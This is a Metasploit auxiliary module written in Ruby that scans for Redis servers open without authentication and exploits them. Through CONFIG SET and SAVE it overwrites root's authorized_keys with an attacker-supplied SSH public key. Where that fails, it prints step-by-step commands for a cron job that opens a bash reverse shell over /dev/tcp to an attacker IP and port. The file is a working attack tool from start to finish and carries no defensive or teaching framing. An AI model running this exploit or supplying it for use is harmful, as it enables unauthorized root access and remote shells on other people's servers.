##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Redis
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Redis Unauthorized Write id_rsa.pub',
      'Description'  => %q(
          This module scans for redis unauthorized and writes the SSH public key, or prompt Cron command.
      ),
      'Author'       => 'AnonySec',
      'License'      => MSF_LICENSE,
      'Platform'     => 'linux',
      'Arch'         => [ARCH_X86, ARCH_X64]))
    register_options(
      [
        Opt::RPORT(6379),
        OptPath.new('SSHPUB', [ true, 'The SSH public key location (absolute path)', '.ssh/id_rsa.pub' ])
      ]
    )
  end

  # SSH公钥写入，执行redis命令
  def sshpub
    redis_command('CONFIG', 'SET', 'dir', '/root/.ssh/')
    redis_command('CONFIG', 'SET', 'dbfilename', 'authorized_keys')
    authorized_key = "\n\n\n" + File.read("#{datastore['SSHPUB']}") + "\n\n\n"
    redis_command('SET', 'x', authorized_key)
    redis_command('SAVE')
    print_good ('SSH public key was written successfully')
  end

  def check
    # info_data = redis_command('INFO')
    # print_good ("#{info_data}")
    # if /redis_version/ =~ info_data

    # 返回数据正则匹配判断
    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
      print_warning ('The Redis is unauthorized')
      if (info_data = redis_command('CONFIG', 'SET', 'dir', '/root/.ssh/')) && /OK/ =~ info_data
        # print_status ('SSH public key is writtening ...')
        sshpub
        elsif
          (info_data = redis_command('CONFIG', 'SET', 'dir', '/var/spool/cron/')) && /OK/ =~ info_data
          # print_warning ('Please use the Cron GetShell')
          print_line ("<----------------Please use the Cron GetShell---------------->")
          print_line ("set xx '\\n* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\\n'")
          print_line ("config set dir /var/spool/cron/")
          print_line ("config set dbfilename root")
          print_line ("save")
          print_line ("<------------------------------------------------------------->")
          return
        end
    else
      print_error ('The Redis is not unauthorized')
      return
    end
  end
  
  # run 与 run_host(_ip) 引用不同
  # def run
  def run_host(_ip)
    print_status('Connecting Redis Server ...')
    begin
      connect
      check
    ensure
      disconnect
    end
  end
end
